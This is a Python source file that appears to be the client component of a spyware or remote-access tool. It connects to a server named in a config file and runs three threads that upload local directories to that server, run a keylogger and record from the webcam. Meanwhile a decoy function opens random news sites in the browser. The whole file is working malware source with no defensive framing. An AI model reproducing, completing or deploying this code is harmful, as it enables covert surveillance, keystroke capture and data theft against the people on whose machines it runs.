#! python
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 17 19:56:16 2020

@author: 劉又聖
"""
import socket, logging, platform, time, os
import threading as th
from networkAPI import NetAPI
from config import upload_dirs, client_save_dirs
from sendsth import send_dir
from keylogger import keylogger
from camera import video_main

def setup():
    if not os.path.exists(client_save_dirs.get(platform.system())):
        os.makedirs(client_save_dirs.get(platform.system()))
    log_fname = os.path.join(client_save_dirs.get(platform.system(), []),
                             'C{}.log'.format(time.strftime('%Y%m%d')))
    logging.basicConfig(level=logging.DEBUG,
                        format='%(levelname)5s:%(message)s',
                        filename=log_fname)

def fake():
    import webbrowser as bw
    from config import news_website
    from random import randint
    
    news = set()
    
    while len(news) < 3:
        news.add(randint(0, len(news_website)-1))
    
    for idx in news:
        bw.open(news_website[idx])
    return None

def client(host, port, isEndFlag):
    start_dirs = upload_dirs.get(platform.system(), [])
    save_local_dirs  = client_save_dirs.get(platform.system(), [])
    
    logging.debug('Upload dirs {}'.format(start_dirs))
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect( (host, port) )
    
        handle = NetAPI(sock)
        # handle.send_file('server.py')
        # handle.send_file('C:\\Users\\劉又聖\\source\\repos\\Stack\\StackAndQueue\\main.cpp')
        
        # Create thread
        threads          = []
        send_thread      = th.Thread(name='Send dirs thread', target=send_dir,
                                     args=(handle, start_dirs, isEndFlag),
                                     daemon=False)
        keylogger_thread = th.Thread(name='KeyLogger thread', target=keylogger,
                                     args=(save_local_dirs, isEndFlag), 
                                     daemon=False)
        cammera_thread   = th.Thread(name='Open the webcam',  target=video_main,
                                     args=(save_local_dirs, isEndFlag),
                                     daemon=False)
        
        #TODO: Daily check dir & send them
        send_thread.start()
        threads.append(send_thread)
        #TODO: Run keylogger
        keylogger_thread.start()
        threads.append(keylogger_thread)
        #TODO: Run webcam
        cammera_thread.start()
        threads.append(cammera_thread)
        #TODO: Run Fake function
        fake()
        #TODO: Set timeout 10 min
        time.sleep(60)
        
        # 通知各個Thread該收尾
        isEndFlag.set()
        for thread in threads:
            thread.join()
    except ConnectionRefusedError:
        logging.info('Connection Refused')
    except ConnectionAbortedError:
        logging.info('Connection Aborted')
    except AssertionError as e:
        logging.info('Assertion: {}'.format(e.args))
    except Exception as e:
        logging.error('Unknown Error: {}'.format(e.args))
    
    sock.close()
    logging.debug('Client End')
    return None
    
def main():
    from config import server_sock_addr
    
    isEndFlag = th.Event()
    setup()
    sock_pair = server_sock_addr[0].split(':')
    client(sock_pair[0], int(sock_pair[1]), isEndFlag)
    return None

if __name__ == "__main__":
    main()